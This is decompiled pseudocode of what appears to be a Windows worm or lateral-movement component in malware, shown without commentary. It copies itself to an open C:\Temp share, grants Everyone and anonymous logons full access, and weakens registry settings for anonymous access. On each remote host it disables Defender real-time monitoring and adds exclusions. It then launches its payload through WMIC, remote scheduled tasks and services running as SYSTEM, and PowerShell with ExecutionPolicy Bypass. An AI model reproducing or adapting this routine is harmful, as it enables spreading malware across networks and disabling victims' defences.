__int64 __fastcall sub_4FEE40()
{
  __int64 v0; // rbx
  __int64 v1; // r14
  __int128 v2; // xmm15
  __int64 v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rdx
  __int64 *v6; // rbp
  __int64 *v7; // rbp
  __int64 *v8; // rbp
  __int64 *v9; // rbp
  __int64 *v10; // rbp
  __int64 v11; // rbx
  __int64 result; // rax
  __int64 v13; // rbx
  __int64 v14; // rax
  __int64 v15; // rdx
  char v16; // cl
  char v17; // al
  __int64 v18; // rsi
  const char *v19; // rbx
  __int64 v20; // rax
  __int64 v21; // rdx
  const char *v22; // rax
  __int64 *v23; // rbp
  __int64 v24; // rdx
  __int64 v25; // rax
  __int64 *v26; // rbp
  __int64 v27; // rdx
  __int64 v28; // rax
  __int64 v29; // rax
  __int64 *v30; // rbp
  __int64 *v31; // rbp
  __int64 *v32; // rbp
  __int64 *v33; // rbp
  __int64 *v34; // rbp
  __int64 *v35; // rbp
  __int64 *v36; // rbp
  __int64 *v37; // rbp
  __int64 v38; // rdx
  __int64 v39; // rax
  __int64 v40; // rax
  __int64 v41; // rdx
  __int64 v42; // rdx
  __int64 v43; // rax
  __int64 v44; // rdx
  __int64 v45; // rax
  __int64 v46; // rax
  __int64 v47; // rdx
  __int64 v48; // rdx
  __int64 v49; // rax
  __int64 v50; // rax
  __int64 v51; // rax
  __int64 v52; // rax
  __int64 *v53; // rbp
  __int64 v54; // rax
  __int64 v55; // rax
  __int64 v56; // rax
  __int64 *v57; // rbp
  __int64 v58; // rax
  __int64 v59; // rax
  __int64 v60; // rax
  __int64 *v61; // rbp
  __int64 v62; // rax
  __int64 v63; // rax
  __int64 v64; // rax
  __int64 *v65; // [rsp+0h] [rbp-368h]
  __int64 v66[11]; // [rsp+10h] [rbp-358h] BYREF
  __int64 v67; // [rsp+68h] [rbp-300h]
  __int64 v68; // [rsp+70h] [rbp-2F8h]
  __int64 v69; // [rsp+78h] [rbp-2F0h]
  __int64 v70; // [rsp+80h] [rbp-2E8h]
  const char *v71; // [rsp+88h] [rbp-2E0h]
  __int64 v72; // [rsp+90h] [rbp-2D8h] BYREF
  const char *v73; // [rsp+98h] [rbp-2D0h]
  __int64 v74; // [rsp+A0h] [rbp-2C8h]
  const char *v75; // [rsp+A8h] [rbp-2C0h]
  __int64 v76; // [rsp+B0h] [rbp-2B8h]
  __int64 v77; // [rsp+B8h] [rbp-2B0h]
  __int64 v78; // [rsp+C0h] [rbp-2A8h]
  __int64 v79; // [rsp+C8h] [rbp-2A0h]
  __int64 v80; // [rsp+D0h] [rbp-298h]
  const char *v81; // [rsp+D8h] [rbp-290h]
  const char *v82; // [rsp+E0h] [rbp-288h]
  __int64 v83; // [rsp+E8h] [rbp-280h]
  __int64 v84; // [rsp+F0h] [rbp-278h]
  const char *v85; // [rsp+F8h] [rbp-270h]
  __int128 v86; // [rsp+100h] [rbp-268h]
  __int128 v87; // [rsp+110h] [rbp-258h]
  __int128 v88; // [rsp+120h] [rbp-248h] BYREF
  __int128 v89; // [rsp+130h] [rbp-238h]
  __int128 v90; // [rsp+140h] [rbp-228h]
  __int128 v91; // [rsp+150h] [rbp-218h] BYREF
  __int128 v92; // [rsp+160h] [rbp-208h]
  __int128 v93; // [rsp+170h] [rbp-1F8h]
  __int128 v94; // [rsp+180h] [rbp-1E8h]
  const char *v95; // [rsp+190h] [rbp-1D8h] BYREF
  __int64 v96; // [rsp+198h] [rbp-1D0h]
  const char *v97; // [rsp+1A0h] [rbp-1C8h]
  __int64 v98; // [rsp+1A8h] [rbp-1C0h]
  const char *v99; // [rsp+1B0h] [rbp-1B8h]
  __int64 v100; // [rsp+1B8h] [rbp-1B0h]
  const char *v101; // [rsp+1C0h] [rbp-1A8h]
  __int64 v102; // [rsp+1C8h] [rbp-1A0h]
  const char *v103; // [rsp+1D0h] [rbp-198h]
  __int64 v104; // [rsp+1D8h] [rbp-190h]
  const char *v105; // [rsp+1E0h] [rbp-188h]
  __int64 v106; // [rsp+1E8h] [rbp-180h]
  const char *v107; // [rsp+1F0h] [rbp-178h]
  const char *v108; // [rsp+1F8h] [rbp-170h]
  const char *v109; // [rsp+200h] [rbp-168h]
  __int64 v110; // [rsp+208h] [rbp-160h]
  const char *v111; // [rsp+210h] [rbp-158h]
  __int64 v112; // [rsp+218h] [rbp-150h]
  const char *v113; // [rsp+220h] [rbp-148h]
  __int64 v114; // [rsp+228h] [rbp-140h]
  __int64 v115; // [rsp+230h] [rbp-138h]
  __int64 v116; // [rsp+238h] [rbp-130h]
  const char *v117; // [rsp+240h] [rbp-128h]
  __int64 v118; // [rsp+248h] [rbp-120h]
  const char *v119; // [rsp+250h] [rbp-118h] BYREF
  __int64 v120; // [rsp+258h] [rbp-110h]
  const char *v121; // [rsp+260h] [rbp-108h] BYREF
  __int64 v122; // [rsp+268h] [rbp-100h]
  const char *v123; // [rsp+270h] [rbp-F8h]
  __int64 v124; // [rsp+278h] [rbp-F0h]
  const char *v125; // [rsp+280h] [rbp-E8h]
  __int64 v126; // [rsp+288h] [rbp-E0h]
  const char *v127; // [rsp+290h] [rbp-D8h]
  __int64 v128; // [rsp+298h] [rbp-D0h]
  const char *v129; // [rsp+2A0h] [rbp-C8h]
  __int64 v130; // [rsp+2A8h] [rbp-C0h]
  const char *v131; // [rsp+2B0h] [rbp-B8h]
  __int64 v132; // [rsp+2B8h] [rbp-B0h]
  const char *v133; // [rsp+2C0h] [rbp-A8h]
  __int64 v134; // [rsp+2C8h] [rbp-A0h]
  const char *v135; // [rsp+2D0h] [rbp-98h]
  __int64 v136; // [rsp+2D8h] [rbp-90h]
  const char *v137; // [rsp+2E0h] [rbp-88h]
  __int64 v138; // [rsp+2E8h] [rbp-80h]
  const char *v139; // [rsp+2F0h] [rbp-78h]
  __int64 v140; // [rsp+2F8h] [rbp-70h]
  const char *v141; // [rsp+300h] [rbp-68h]
  __int64 v142; // [rsp+308h] [rbp-60h]
  const char *v143; // [rsp+310h] [rbp-58h] BYREF
  __int64 v144; // [rsp+318h] [rbp-50h]
  const char *v145; // [rsp+320h] [rbp-48h]
  __int64 v146; // [rsp+328h] [rbp-40h]
  const char *v147; // [rsp+330h] [rbp-38h]
  __int64 v148; // [rsp+338h] [rbp-30h]
  const char *v149; // [rsp+340h] [rbp-28h]
  __int64 v150; // [rsp+348h] [rbp-20h]
  const char *v151; // [rsp+350h] [rbp-18h]
  __int64 v152; // [rsp+358h] [rbp-10h]
  __int64 v153; // [rsp+360h] [rbp-8h]
  __int64 vars0; // [rsp+368h] [rbp+0h] BYREF

  if ( (unsigned __int64)&v72 <= *(_QWORD *)(v1 + 16) )
    sub_470660();
  sub_4B84A0();
  v79 = sub_4C8D60();
  v69 = v0;
  v84 = sub_4B4D40();
  v74 = v0;
  v3 = path_filepath_Base();
  if ( qword_6C7F78 == 0 )
    sub_472A00();
  v67 = v0;
  v77 = v3;
  v4 = qword_6C7F78 - 1;
  v78 = sub_4C83E0(a1: " ", a2: 1, a3: qword_6C7F70, a4: qword_6C7F80 - 1);
  v68 = v4;
  v83 = runtime_concatstring2(a1: v77, a2: v67, a3: v5, a4: 8);
  v73 = "C:\\Temp\\";
  os_MkdirAll();
  v65 = &vars0;
  sub_472C10(a1: &v66[90]);
  v6 = v65;
  v144 = 2;
  v143 = "/C";
  v146 = 4;
  v145 = "copy";
  v148 = v74;
  v147 = (const char *)v84;
  v150 = (__int64)v73;
  v149 = (const char *)v83;
  v152 = 2;
  v151 = "/Y";
  sub_4CDE40(a1: 5, a2: 5, a3: "/Y", a4: &v143);
  sub_4CF220();
  v65 = v6;
  sub_472C10(a1: &v66[90]);
  v7 = v65;
  v144 = 2;
  v143 = "/C";
  v146 = 3;
  v145 = "net";
  v148 = 5;
  v147 = "share";
  v150 = 14;
  v149 = "share$=C:\\Temp";
  v152 = 20;
  v151 = "/GRANT:Everyone,FULL";
  sub_4CDE40(a1: 5, a2: 5, a3: "/GRANT:Everyone,FULL", a4: &v143);
  sub_4CF220();
  v65 = v7;
  sub_472C10(a1: &v66[90]);
  v8 = v65;
  v144 = 2;
  v143 = "/C";
  v146 = 6;
  v145 = "icacls";
  v148 = 7;
  v147 = "C:\\Temp";
  v150 = 6;
  v149 = "/grant";
  v152 = 19;
  v151 = "\"ANONYMOUS LOGON\":F";
  sub_4CDE40(a1: 5, a2: 5, a3: "\"ANONYMOUS LOGON\":F", a4: &v143);
  sub_4CF220();
  v65 = v8;
  sub_472BEF(a1: &v119);
  v9 = v65;
  v122 = 2;
  v121 = "/C";
  v124 = 3;
  v123 = "reg";
  v126 = 3;
  v125 = "add";
  v128 = 62;
  v127 = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters";
  v130 = 2;
  v129 = "/v";
  v132 = 17;
  v131 = "NullSessionShares";
  v134 = 2;
  v133 = "/t";
  v136 = 12;
  v135 = "REG_MULTI_SZ";
  v138 = 2;
  v137 = "/d";
  v140 = 6;
  v139 = "share$";
  v142 = 2;
  v141 = "/f";
  sub_4CDE40(a1: 11, a2: 11, a3: "/f", a4: &v121);
  sub_4CF220();
  v65 = v9;
  sub_472BEF(a1: &v119);
  v10 = v65;
  v122 = 2;
  v121 = "/C";
  v124 = 3;
  v123 = "reg";
  v126 = 3;
  v125 = "add";
  v128 = 41;
  v127 = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa";
  v130 = 2;
  v129 = "/v";
  v132 = 25;
  v131 = "EveryoneIncludesAnonymous";
  v134 = 2;
  v133 = "/t";
  v136 = 9;
  v135 = "REG_DWORD";
  v138 = 2;
  v137 = "/d";
  v140 = 1;
  v139 = "1";
  v142 = 2;
  v141 = "/f";
  v11 = 3;
  sub_4CDE40(a1: 11, a2: 11, a3: "/f", a4: &v121);
  sub_4CF220();
  result = sub_4FEA00();
  while ( v11 > 0 )
  {
    v76 = v11;
    v153 = result;
    v13 = *(_QWORD *)(result + 8);
    strings_TrimSpace();
    v14 = sub_4C8D60();
    v72 = v13;
    v82 = (const char *)v14;
    if ( v13 != 0 )
    {
      v15 = v69;
      if ( v13 == v69 )
      {
        v17 = sub_4033C0();
        v15 = v69;
        v13 = v72;
        v16 = v17;
        v14 = (__int64)v82;
      }
      else
      {
        v16 = 0;
      }
    }
    else
    {
      v15 = v69;
      v16 = 1;
    }
    if ( v16 == 0 )
    {
      v18 = v13;
      v19 = "\\\\";
      v20 = runtime_concatstring4(a1: v14, a2: v18, a3: v15, a4: 2, a5: "\\share$\\", a6: 8);
      if ( v68 != 0 )
      {
        v19 = (const char *)v20;
        v20 = runtime_concatstring3(a1: " ", a2: 1, a3: v21, a4: "\\\\", a5: v78);
      }
      v71 = v19;
      v81 = (const char *)v20;
      v66[2] = runtime_concatstring5(a1: (__int64)"'\"", a2: 2);
      v85 = v22;
      v75 = "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:"
            "\\'; Add-MpPreference -ExclusionPath 'C:\\Temp'; Add-MpPreference -ExclusionPath '\\\\";
      v65 = v10;
      sub_472C10(a1: &v66[90]);
      v23 = v65;
      v25 = runtime_concatstring2(a1: v82, a2: v72, a3: v24, a4: 6);
      v144 = (__int64)"/node:";
      v143 = (const char *)v25;
      v146 = 7;
      v145 = "process";
      v148 = 4;
      v147 = "call";
      v150 = 6;
      v149 = "create";
      v152 = (__int64)v75;
      v151 = v85;
      sub_4CDE40(a1: 5, a2: 5, a3: v85, a4: &v143);
      sub_4CF220();
      sub_46E780();
      v65 = v23;
      sub_472C10(a1: &v66[90]);
      v26 = v65;
      v28 = runtime_concatstring2(a1: v82, a2: v72, a3: v27, a4: 6);
      v144 = (__int64)"/node:";
      v143 = (const char *)v28;
      v146 = 7;
      v145 = "process";
      v148 = 4;
      v147 = "call";
      v150 = 6;
      v149 = "create";
      v152 = (__int64)v71;
      v151 = v81;
      sub_4CDE40(a1: 5, a2: 5, a3: v81, a4: &v143);
      sub_4CF220();
      sub_495140();
      sub_490100(a1: 120000000000LL);
      v80 = sub_48C180(a1: "15:04", a2: 5);
      v70 = 4;
      v65 = v26;
      v29 = sub_472BEF(a1: &v119);
      v30 = v65;
      v122 = 7;
      v121 = "/Create";
      v124 = 2;
      v123 = "/S";
      v126 = v72;
      v125 = v82;
      v128 = 3;
      v127 = "/TN";
      v130 = 4;
      v129 = "DefU";
      v132 = 3;
      v131 = "/TR";
      v134 = (__int64)v75;
      v133 = v85;
      v136 = 3;
      v135 = "/SC";
      v138 = 4;
      v137 = "ONCE";
      v140 = 3;
      v139 = "/ST";
      v142 = 4;
      v141 = (const char *)v29;
      sub_4CDE40(a1: 11, a2: 11, a3: "/ST", a4: &v121);
      sub_4CF220();
      v65 = v30;
      sub_472C10(a1: &v66[90]);
      v31 = v65;
      v144 = 4;
      v143 = "/Run";
      v146 = 2;
      v145 = "/S";
      v148 = v72;
      v147 = v82;
      v150 = 3;
      v149 = "/TN";
      v152 = 4;
      v151 = "DefU";
      sub_4CDE40(a1: 5, a2: 5, a3: "DefU", a4: &v143);
      sub_4CF220();
      sub_46E780();
      v65 = v31;
      sub_472BEF(a1: &v119);
      v32 = v65;
      v122 = 7;
      v121 = "/Create";
      v124 = 2;
      v123 = "/S";
      v126 = v72;
      v125 = v82;
      v128 = 3;
      v127 = "/TN";
      v130 = 8;
      v129 = "UpdateGU";
      v132 = 3;
      v131 = "/TR";
      v134 = (__int64)v71;
      v133 = v81;
      v136 = 3;
      v135 = "/SC";
      v138 = 4;
      v137 = "ONCE";
      v140 = 3;
      v139 = "/ST";
      v142 = v70;
      v141 = (const char *)v80;
      sub_4CDE40(a1: 11, a2: 11, a3: v80, a4: &v121);
      sub_4CF220();
      v65 = v32;
      sub_472C10(a1: &v66[90]);
      v33 = v65;
      v144 = 4;
      v143 = "/Run";
      v146 = 2;
      v145 = "/S";
      v148 = v72;
      v147 = v82;
      v150 = 3;
      v149 = "/TN";
      v152 = 8;
      v151 = "UpdateGU";
      sub_4CDE40(a1: 5, a2: 5, a3: "UpdateGU", a4: &v143);
      sub_4CF220();
      v65 = v33;
      sub_472BE2(a1: &v66[42]);
      v34 = v65;
      v96 = 7;
      v95 = "/Create";
      v98 = 2;
      v97 = "/S";
      v100 = v72;
      v99 = v82;
      v102 = 3;
      v101 = "/TN";
      v104 = 4;
      v103 = "DefS";
      v106 = 3;
      v105 = "/TR";
      v108 = v75;
      v107 = v85;
      v110 = 3;
      v109 = "/SC";
      v112 = 4;
      v111 = "ONCE";
      v114 = 3;
      v113 = "/ST";
      v116 = v70;
      v115 = v80;
      v118 = 3;
      v117 = "/RU";
      v120 = 6;
      v119 = "SYSTEM";
      sub_4CDE40(a1: 13, a2: 13, a3: "SYSTEM", a4: &v95);
      sub_4CF220();
      v65 = v34;
      sub_472C10(a1: &v66[90]);
      v35 = v65;
      v144 = 4;
      v143 = "/Run";
      v146 = 2;
      v145 = "/S";
      v148 = v72;
      v147 = v82;
      v150 = 3;
      v149 = "/TN";
      v152 = 4;
      v151 = "DefS";
      sub_4CDE40(a1: 5, a2: 5, a3: "DefS", a4: &v143);
      sub_4CF220();
      sub_46E780();
      v65 = v35;
      sub_472BE2(a1: &v66[42]);
      v36 = v65;
      v96 = 7;
      v95 = "/Create";
      v98 = 2;
      v97 = "/S";
      v100 = v72;
      v99 = v82;
      v102 = 3;
      v101 = "/TN";
      v104 = 8;
      v103 = "UpdateGS";
      v106 = 3;
      v105 = "/TR";
      v108 = v71;
      v107 = v81;
      v110 = 3;
      v109 = "/SC";
      v112 = 4;
      v111 = "ONCE";
      v114 = 3;
      v113 = "/ST";
      v116 = v70;
      v115 = v80;
      v118 = 3;
      v117 = "/RU";
      v120 = 6;
      v119 = "SYSTEM";
      sub_4CDE40(a1: 13, a2: 13, a3: "SYSTEM", a4: &v95);
      sub_4CF220();
      v65 = v36;
      sub_472C10(a1: &v66[90]);
      v37 = v65;
      v144 = 4;
      v143 = "/Run";
      v146 = 2;
      v145 = "/S";
      v148 = v72;
      v147 = v82;
      v150 = 3;
      v149 = "/TN";
      v152 = 8;
      v151 = "UpdateGS";
      sub_4CDE40(a1: 5, a2: 5, a3: "UpdateGS", a4: &v143);
      sub_4CF220();
      v91 = v2;
      v92 = v2;
      v93 = v2;
      v94 = v2;
      v39 = runtime_concatstring2(a1: v82, a2: v72, a3: v38, a4: 2);
      *((_QWORD *)&v91 + 1) = "\\\\";
      *(_QWORD *)&v91 = v39;
      *((_QWORD *)&v92 + 1) = 6;
      *(_QWORD *)&v92 = "create";
      *((_QWORD *)&v93 + 1) = 6;
      *(_QWORD *)&v93 = "DefSvc";
      v40 = runtime_concatstring3(a1: v85, a2: v75, a3: "DefSvc", a4: 9, a5: "\"");
      *((_QWORD *)&v94 + 1) = "binPath=\"";
      *(_QWORD *)&v94 = v40;
      sub_4CDE40(a1: 4, a2: 4, a3: v41, a4: &v91);
      sub_4CF220();
      v88 = v2;
      v89 = v2;
      v90 = v2;
      v43 = runtime_concatstring2(a1: v82, a2: v72, a3: v42, a4: 2);
      *((_QWORD *)&v88 + 1) = "\\\\";
      *(_QWORD *)&v88 = v43;
      *((_QWORD *)&v89 + 1) = 5;
      *(_QWORD *)&v89 = "start";
      *((_QWORD *)&v90 + 1) = 6;
      *(_QWORD *)&v90 = "DefSvc";
      sub_4CDE40(a1: 3, a2: 3, a3: "DefSvc", a4: &v88);
      sub_4CF220();
      sub_46E780();
      v91 = v2;
      v92 = v2;
      v93 = v2;
      v94 = v2;
      v45 = runtime_concatstring2(a1: v82, a2: v72, a3: v44, a4: 2);
      *((_QWORD *)&v91 + 1) = "\\\\";
      *(_QWORD *)&v91 = v45;
      *((_QWORD *)&v92 + 1) = 6;
      *(_QWORD *)&v92 = "create";
      *((_QWORD *)&v93 + 1) = 9;
      *(_QWORD *)&v93 = "UpdateSvc";
      v46 = runtime_concatstring3(a1: v81, a2: v71, a3: "UpdateSvc", a4: 9, a5: "\"");
      *((_QWORD *)&v94 + 1) = "binPath=\"";
      *(_QWORD *)&v94 = v46;
      sub_4CDE40(a1: 4, a2: 4, a3: v47, a4: &v91);
      sub_4CF220();
      v88 = v2;
      v89 = v2;
      v90 = v2;
      v49 = runtime_concatstring2(a1: v82, a2: v72, a3: v48, a4: 2);
      *((_QWORD *)&v88 + 1) = "\\\\";
      *(_QWORD *)&v88 = v49;
      *((_QWORD *)&v89 + 1) = 5;
      *(_QWORD *)&v89 = "start";
      *((_QWORD *)&v90 + 1) = 9;
      *(_QWORD *)&v90 = "UpdateSvc";
      sub_4CDE40(a1: 3, a2: 3, a3: "UpdateSvc", a4: &v88);
      sub_4CF220();
      v86 = v2;
      v87 = v2;
      v50 = runtime_convTstring();
      *(_QWORD *)&v86 = &unk_50FEE0;
      *((_QWORD *)&v86 + 1) = v50;
      v51 = runtime_convTstring();
      *(_QWORD *)&v87 = &unk_50FEE0;
      *((_QWORD *)&v87 + 1) = v51;
      fmt_Sprintf();
      v65 = v37;
      v52 = sub_472C10(a1: &v66[90]);
      v53 = v65;
      v144 = 10;
      v143 = "-NoProfile";
      v146 = 16;
      v145 = "-ExecutionPolicy";
      v148 = 6;
      v147 = "Bypass";
      v150 = 8;
      v149 = "-Command";
      v152 = 178;
      v151 = (const char *)v52;
      sub_4CDE40(a1: 5, a2: 5, a3: "-Command", a4: &v143);
      sub_4CF220();
      sub_46E780();
      v86 = v2;
      v87 = v2;
      v54 = runtime_convTstring();
      *(_QWORD *)&v86 = &unk_50FEE0;
      *((_QWORD *)&v86 + 1) = v54;
      v55 = runtime_convTstring();
      *(_QWORD *)&v87 = &unk_50FEE0;
      *((_QWORD *)&v87 + 1) = v55;
      fmt_Sprintf();
      v65 = v53;
      v56 = sub_472C10(a1: &v66[90]);
      v57 = v65;
      v144 = 10;
      v143 = "-NoProfile";
      v146 = 16;
      v145 = "-ExecutionPolicy";
      v148 = 6;
      v147 = "Bypass";
      v150 = 8;
      v149 = "-Command";
      v152 = 67;
      v151 = (const char *)v56;
      sub_4CDE40(a1: 5, a2: 5, a3: "-Command", a4: &v143);
      sub_4CF220();
      v86 = v2;
      v87 = v2;
      v58 = runtime_convTstring();
      *(_QWORD *)&v86 = &unk_50FEE0;
      *((_QWORD *)&v86 + 1) = v58;
      v59 = runtime_convTstring();
      *(_QWORD *)&v87 = &unk_50FEE0;
      *((_QWORD *)&v87 + 1) = v59;
      fmt_Sprintf();
      v65 = v57;
      v60 = sub_472C10(a1: &v66[90]);
      v61 = v65;
      v144 = 10;
      v143 = "-NoProfile";
      v146 = 16;
      v145 = "-ExecutionPolicy";
      v148 = 6;
      v147 = "Bypass";
      v150 = 8;
      v149 = "-Command";
      v152 = 63;
      v151 = (const char *)v60;
      sub_4CDE40(a1: 5, a2: 5, a3: "-Command", a4: &v143);
      sub_4CF220();
      sub_46E780();
      v86 = v2;
      v87 = v2;
      v62 = runtime_convTstring();
      *(_QWORD *)&v86 = &unk_50FEE0;
      *((_QWORD *)&v86 + 1) = v62;
      v63 = runtime_convTstring();
      *(_QWORD *)&v87 = &unk_50FEE0;
      *((_QWORD *)&v87 + 1) = v63;
      fmt_Sprintf();
      v65 = v61;
      v64 = sub_472C10(a1: &v66[90]);
      v10 = v65;
      v144 = 10;
      v143 = "-NoProfile";
      v146 = 16;
      v145 = "-ExecutionPolicy";
      v148 = 6;
      v147 = "Bypass";
      v150 = 8;
      v149 = "-Command";
      v152 = 63;
      v151 = (const char *)v64;
      sub_4CDE40(a1: 5, a2: 5, a3: "-Command", a4: &v143);
      sub_4CF220();
    }
    result = v153 + 16;
    v11 = v76 - 1;
  }
  return result;
}